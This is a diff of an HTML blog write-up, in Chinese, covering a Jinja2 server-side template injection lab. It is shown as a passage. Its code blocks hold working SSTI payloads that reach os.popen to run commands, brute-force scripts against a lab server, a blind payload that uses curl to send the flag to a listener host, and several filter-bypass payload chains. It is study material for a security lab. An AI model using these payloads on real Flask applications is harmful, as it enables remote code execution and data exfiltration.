+  &#123;% endfor %&#125;
+&#123;% endif %&#125;
+&#123;% endfor %&#125;</code></pre>
 
 <p>但是我这里没打通.后来在开服务的机器上查了下发现没有 <code>catch_warnings</code>这个类.也懒的改了,感兴趣的可以试试.</p>
 <h3 id="Level-2-bypass"><a href="#Level-2-bypass" class="headerlink" title="Level 2 bypass {{"></a>Level 2 bypass {{</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190118628.png" alt="image-20210924190118628"></p>
@@ -364,7 +459,23 @@
 <p>详细内容可前往 <a target="_blank" rel="noopener" href="https://jinja.palletsprojects.com/templates/">Jinja2 模板官方文档</a>进行了解</p>
 </blockquote>
 <p>写个盲注脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;</span>&#125;</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;payload&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,data)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果为 132 ---&gt; &#123;&#x27;code&#x27;: &#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.0.108:5001/level/2&quot;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):
+	<span class="hljs-keyword">try</span>:
+		data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;</span>&#125;
+		response = requests.post(url,data=data)
+		<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
+			<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;payload&quot;</span> <span class="hljs-keyword">in</span> response.text:
+				<span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;---&gt;&quot;</span>,data)
+				<span class="hljs-keyword">break</span>
+	<span class="hljs-keyword">except</span> :
+		<span class="hljs-keyword">pass</span>
+
+<span class="hljs-comment"># 结果为 132 ---&gt; &#123;&#x27;code&#x27;: &#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() %&#125;payload&#123;% endif %&#125;&#x27;&#125;</span>
+</code></pre>
 
 <p>脚本结果说明<code>132索引</code>能够执行代码,配合<code>{%print(code)%}</code>,拿到flag</p>
 <p><code>{%print(&quot;&quot;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&quot;popen&quot;](&quot;cat flag&quot;).read() )%}</code></p>
@@ -373,12 +484,26 @@
 <p>如<code>popen(&#39;cat flag&#39;).read(1)</code>则表示内容的第一位,<code>popen(&#39;cat flag&#39;).read(2)</code>表示内容的前两位,依次类推.</p>
 <h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210924190126091.png" alt="image-20210924190126091"></p>
 <p>这题一开始没懂什么意思,看了源码才理解</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">level3</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        render_template_string(code)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;correct&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;wrong&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">level3</span>(<span class="hljs-params">code</span>):
+    <span class="hljs-keyword">try</span>:
+        render_template_string(code)
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;correct&quot;</span>
+    <span class="hljs-keyword">except</span> Exception:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;wrong&quot;</span></code></pre>
 
 <p>对输入的字符串进行渲染,如果渲染异常返回wrong,渲染正确返回correct.</p>
 <p>由于没有任何回显,可以写个脚本盲打</p>
 <p>脚本内容如下:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.0.105:8081/`cat flag`&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.0.108:5001/level/3&quot;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):
+	<span class="hljs-keyword">try</span>:
+		data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span> + <span class="hljs-built_in">str</span>(i) + <span class="hljs-string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;curl http://192.168.0.105:8081/`cat flag`&quot;).read()&#125;&#125;&#x27;</span>&#125;
+		response = requests.post(url,data=data)
+	<span class="hljs-keyword">except</span> :
+		<span class="hljs-keyword">pass</span></code></pre>
 
 <p> 在本地开个监听,</p>
 <p>运行脚本,拿到flag</p>
@@ -388,7 +513,21 @@
 <p>__getitem__() 是python的一个魔法方法,当对列表使用时,传入整数返回列表对应索引的值;对字典使用时,传入字符串,返回字典相应键所对应的值.</p>
 </blockquote>
 <p>简单更改 <code>Level 1</code>的脚本用于本题</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.108:5001/level/4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">	data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+ <span class="built_in">str</span>(i) +<span class="string">&#x27;)&#125;&#125;&#x27;</span>&#125; </span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">				<span class="built_in">print</span>(i,<span class="string">&quot;-----&gt;&quot;</span>,response.text)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> :</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line"><span class="comment"># 结果  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;http://192.168.0.108:5001/level/4&quot;</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>):
+	data = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+ <span class="hljs-built_in">str</span>(i) +<span class="hljs-string">&#x27;)&#125;&#125;&#x27;</span>&#125; 
+	<span class="hljs-keyword">try</span>:
+		response = requests.post(url,data=data)
+		<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
+			<span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:
+				<span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;-----&gt;&quot;</span>,response.text)
+				<span class="hljs-keyword">break</span>
+	<span class="hljs-keyword">except</span> :
+		<span class="hljs-keyword">pass</span>
+<span class="hljs-comment"># 结果  132 -----&gt; Hello &amp;lt;class &amp;#39;os._wrap_close&amp;#39;&amp;gt;</span></code></pre>
 
 <p>可以看到列表132的索引位置出现了可利用的类,直接构造payload,拿到flag</p>
 <p><code>{{&#39;&#39;.__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(&#39;popen&#39;)(&#39;cat flag&#39;).read()}}</code></p>
@@ -404,7 +543,13 @@
 <blockquote>
 <p>request 代码详细内容可前往<a target="_blank" rel="noopener" href="https://dormousehole.readthedocs.io/en/latest/api.html#flask.request">官方文档</a>自行了解</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key   	 获取get传入的key的值</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      获取cookies传入参数</span><br><span class="line">request.headers      获取请求头请求参数</span><br><span class="line">request.form.key   	 获取post传入参数	(Content-<span class="type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 获取post传入参数	(Content-<span class="type">Type</span>:a/b)</span><br><span class="line">request.json		 获取post传入json参数  (Content-<span class="type">Type</span>: application/json)</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">request.args.key   	 获取get传入的key的值
+request.values.x1 	 所有参数
+request.cookies      获取cookies传入参数
+request.headers      获取请求头请求参数
+request.form.key   	 获取post传入参数	(Content-<span class="hljs-type">Type</span>:applicaation/x-www-form-urlencoded或multipart/form-data)
+request.data  		 获取post传入参数	(Content-<span class="hljs-type">Type</span>:a/b)
+request.json		 获取post传入json参数  (Content-<span class="hljs-type">Type</span>: application/json)</code></pre>
 
 
 
@@ -490,7 +635,27 @@
 </tr>
 </tbody></table>
 <p><em><strong>常用过滤器</strong></em></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">length() <span class="comment"># 获取一个序列或者字典的长度并将其返回</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span>()：<span class="comment"># 将值转换为int类型；</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">float</span>()：<span class="comment"># 将值转换为float类型；</span></span><br><span class="line"></span><br><span class="line">lower()：<span class="comment"># 将字符串转换为小写；</span></span><br><span class="line"></span><br><span class="line">upper()：<span class="comment"># 将字符串转换为大写；</span></span><br><span class="line"></span><br><span class="line">reverse()：<span class="comment"># 反转字符串；</span></span><br><span class="line"></span><br><span class="line">replace(value,old,new)： <span class="comment"># 将value中的old替换为new</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span>()：<span class="comment"># 将变量转换为列表类型；</span></span><br><span class="line"></span><br><span class="line">string()：<span class="comment"># 将变量转换成字符串类型；</span></span><br><span class="line"></span><br><span class="line">join()：<span class="comment"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span></span><br><span class="line"></span><br><span class="line">attr(): <span class="comment"># 获取对象的属性</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">length() <span class="hljs-comment"># 获取一个序列或者字典的长度并将其返回</span>
+
+<span class="hljs-built_in">int</span>()：<span class="hljs-comment"># 将值转换为int类型；</span>
+
+<span class="hljs-built_in">float</span>()：<span class="hljs-comment"># 将值转换为float类型；</span>
+
+lower()：<span class="hljs-comment"># 将字符串转换为小写；</span>
+
+upper()：<span class="hljs-comment"># 将字符串转换为大写；</span>
+
+reverse()：<span class="hljs-comment"># 反转字符串；</span>
+
+replace(value,old,new)： <span class="hljs-comment"># 将value中的old替换为new</span>
+
+<span class="hljs-built_in">list</span>()：<span class="hljs-comment"># 将变量转换为列表类型；</span>
+
+string()：<span class="hljs-comment"># 将变量转换成字符串类型；</span>
+
+join()：<span class="hljs-comment"># 将一个序列中的参数值拼接成字符串,通常有python内置的dict()配合使用</span>
+
+attr(): <span class="hljs-comment"># 获取对象的属性</span></code></pre>
 
 
 
@@ -538,7 +703,8 @@
 <li><p>使用<code>replace</code>过滤器.如<code>{%set a=&quot;__claee__&quot;|replace(&quot;ee&quot;,&quot;ss&quot;)%}{{a}}</code></p>
 </li>
 <li><p>利用python的<code>char()</code>.例如</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">chr</span> %&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="built_in">chr</span>(<span class="number">95</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">99</span>)%2bchr(<span class="number">108</span>)%2bchr(<span class="number">97</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">115</span>)%2bchr(<span class="number">95</span>)%2bchr(<span class="number">95</span>)]&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span> %&#125;
+&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">99</span>)%2bchr(<span class="hljs-number">108</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)]&#125;&#125;</code></pre>
 
 <p>…</p>
 </li>
@@ -567,7 +733,10 @@
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926170311552.png" alt="image-20210926170311552"></p>
 <p>不过在后面构造命令<code>cat flag</code>时空格无法识别.通过这篇<a target="_blank" rel="noopener" href="https://buaq.net/go-74232.html">博客</a>,发现了新思路.</p>
 <h4 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h4><p>通过以下构造可以得到字符串,举个例,可以发现输出的字符串中存在空格、部分数字、<code>&lt;</code>以及部分字母.利用过滤器<code>list</code>将其变为列表类型再配合使用索引,就能得到我们想要的.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;
+&#123;% <span class="hljs-built_in">set</span> org = (self|string()) %&#125;&#123;&#123;org&#125;&#125;
+&#123;% <span class="hljs-built_in">set</span> org = self|string|urlencode %&#125;&#123;&#123;org&#125;&#125;
+&#123;% <span class="hljs-built_in">set</span> org = (app.__doc__|string) %&#125;&#123;&#123;org&#125;&#125;</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927143907669.png" alt="image-20210927143907669"></p>
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927144342078.png" alt="image-20210927144342078"></p>
@@ -578,7 +747,17 @@
 <blockquote>
 <p>payload原型:().__class__.__base__.__subclasses__()[132].__init__.__globals__[‘popen’](‘cat flag’).read()</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=<span class="built_in">dict</span>(__cla=a,ss__=b)|join %&#125;  <span class="comment"># __class__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(__bas=a,e__=b)|join %&#125;	  <span class="comment"># __basess__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> c=<span class="built_in">dict</span>(__subcla=a,sses__=b)|join %&#125;    <span class="comment"># __subclasses__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=<span class="built_in">dict</span>(__ge=a,titem__=a)|join%&#125;    <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(__<span class="keyword">in</span>=a,it__=b)|join %&#125;		 <span class="comment"># __init__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=<span class="built_in">dict</span>(__glo=a,bals__=b)|join %&#125;	<span class="comment"># __globals__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> g=<span class="built_in">dict</span>(pop=a,en=b)|join %&#125;	<span class="comment"># popen</span></span><br><span class="line">&#123;%<span class="built_in">set</span> h=self|string|attr(d)(<span class="number">18</span>)%&#125;	<span class="comment"># 空格</span></span><br><span class="line">&#123;%<span class="built_in">set</span> i=(<span class="built_in">dict</span>(cat=abc)|join,h,<span class="built_in">dict</span>(flag=b)|join)|join%&#125;  <span class="comment"># cat flag</span></span><br><span class="line">&#123;%<span class="built_in">set</span> j=<span class="built_in">dict</span>(read=a)|join%&#125; <span class="comment"># read</span></span><br><span class="line">&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(<span class="number">132</span>)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-built_in">dict</span>(__cla=a,ss__=b)|join %&#125;  <span class="hljs-comment"># __class__</span>
+&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-built_in">dict</span>(__bas=a,e__=b)|join %&#125;	  <span class="hljs-comment"># __basess__</span>
+&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-built_in">dict</span>(__subcla=a,sses__=b)|join %&#125;    <span class="hljs-comment"># __subclasses__</span>
+&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-built_in">dict</span>(__ge=a,titem__=a)|join%&#125;    <span class="hljs-comment"># __getitem__</span>
+&#123;%<span class="hljs-built_in">set</span> e=<span class="hljs-built_in">dict</span>(__<span class="hljs-keyword">in</span>=a,it__=b)|join %&#125;		 <span class="hljs-comment"># __init__</span>
+&#123;%<span class="hljs-built_in">set</span> f=<span class="hljs-built_in">dict</span>(__glo=a,bals__=b)|join %&#125;	<span class="hljs-comment"># __globals__</span>
+&#123;%<span class="hljs-built_in">set</span> g=<span class="hljs-built_in">dict</span>(pop=a,en=b)|join %&#125;	<span class="hljs-comment"># popen</span>
+&#123;%<span class="hljs-built_in">set</span> h=self|string|attr(d)(<span class="hljs-number">18</span>)%&#125;	<span class="hljs-comment"># 空格</span>
+&#123;%<span class="hljs-built_in">set</span> i=(<span class="hljs-built_in">dict</span>(cat=abc)|join,h,<span class="hljs-built_in">dict</span>(flag=b)|join)|join%&#125;  <span class="hljs-comment"># cat flag</span>
+&#123;%<span class="hljs-built_in">set</span> j=<span class="hljs-built_in">dict</span>(read=a)|join%&#125; <span class="hljs-comment"># read</span>
+&#123;&#123;()|attr(a)|attr(b)|attr(c)()|attr(d)(<span class="hljs-number">132</span>)|attr(e)|attr(f)|attr(d)(g)(i)|attr(j)()&#125;&#125;</code></pre>
 
 
 
@@ -593,7 +772,18 @@
 <blockquote>
 <p>payload原型: x.__init__.__globals__[‘__builtins__‘]<a href="%22__import__('os').popen('whoami').read()%22">‘eval’</a></p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(pop=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> c=a|attr(b)(self|string|length)%&#125;  <span class="comment"># _</span></span><br><span class="line">&#123;%<span class="built_in">set</span> d=(c,c,<span class="built_in">dict</span>(getitem=a)|join,c,c)|join%&#125;  <span class="comment"># __getitem__</span></span><br><span class="line">&#123;%<span class="built_in">set</span> e=<span class="built_in">dict</span>(args=a)|join%&#125;		<span class="comment"># args</span></span><br><span class="line">&#123;%<span class="built_in">set</span> f=<span class="built_in">dict</span>(get=a)|join%&#125;		<span class="comment"># get</span></span><br><span class="line">&#123;%<span class="built_in">set</span> g=<span class="built_in">dict</span>(z=a)|join%&#125;		</span><br><span class="line">&#123;%<span class="built_in">set</span> gg=<span class="built_in">dict</span>(zz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ggg=<span class="built_in">dict</span>(zzz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> gggg=<span class="built_in">dict</span>(zzzz=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ggggg=<span class="built_in">dict</span>(zzzzz=a)|join%&#125;</span><br><span class="line">&#123;&#123;x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))&#125;&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=&#123;&#125;|select|string|<span class="hljs-built_in">list</span>%&#125;
+&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-built_in">dict</span>(pop=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> c=a|attr(b)(self|string|length)%&#125;  <span class="hljs-comment"># _</span>
+&#123;%<span class="hljs-built_in">set</span> d=(c,c,<span class="hljs-built_in">dict</span>(getitem=a)|join,c,c)|join%&#125;  <span class="hljs-comment"># __getitem__</span>
+&#123;%<span class="hljs-built_in">set</span> e=<span class="hljs-built_in">dict</span>(args=a)|join%&#125;		<span class="hljs-comment"># args</span>
+&#123;%<span class="hljs-built_in">set</span> f=<span class="hljs-built_in">dict</span>(get=a)|join%&#125;		<span class="hljs-comment"># get</span>
+&#123;%<span class="hljs-built_in">set</span> g=<span class="hljs-built_in">dict</span>(z=a)|join%&#125;		
+&#123;%<span class="hljs-built_in">set</span> gg=<span class="hljs-built_in">dict</span>(zz=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> ggg=<span class="hljs-built_in">dict</span>(zzz=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> gggg=<span class="hljs-built_in">dict</span>(zzzz=a)|join%&#125;
+&#123;%<span class="hljs-built_in">set</span> ggggg=<span class="hljs-built_in">dict</span>(zzzzz=a)|join%&#125;
+&#123;&#123;x|attr(request|attr(e)|attr(f)(g))|attr(request|attr(e)|attr(f)(gg))|attr(d)(request|attr(e)|attr(f)(ggg))|attr(d)(request|attr(e)|attr(f)(gggg))(request|attr(e)|attr(f)(ggggg))&#125;&#125;</code></pre>
 
 <p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210927125427004.png" alt="image-20210927125427004"></p>
 <h3 id="Level-13-bypass-combination3"><a href="#Level-13-bypass-combination3" class="headerlink" title="Level 13 bypass combination3"></a>Level 13 bypass combination3</h3><p><img src="https://particles.oss-cn-beijing.aliyuncs.com/img/image-20210926143742060.png" alt="image-20210926143742060"></p>
@@ -602,7 +792,25 @@
 <blockquote>
 <p>payload原型:x.__init__.__globals__[‘__builtins__‘][‘__import__‘](‘os’).popen(‘cat flag’).read()”)</p>
 </blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> a=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ax=&#123;&#125;|select|string|<span class="built_in">list</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aa=<span class="built_in">dict</span>(ssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaa=<span class="built_in">dict</span>(ssssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaaa=<span class="built_in">dict</span>(ss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> aaaaa=<span class="built_in">dict</span>(sssss=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> b=<span class="built_in">dict</span>(pop=a)|join%&#125;   <span class="comment"># pop</span></span><br><span class="line">&#123;%<span class="built_in">set</span> c=a|attr(b)(aa|length*aaa|length)%&#125;  <span class="comment"># _</span></span><br><span class="line">&#123;%<span class="built_in">set</span> cc=a|attr(b)(aaaa|length*aaaaa|length)%&#125; <span class="comment"># 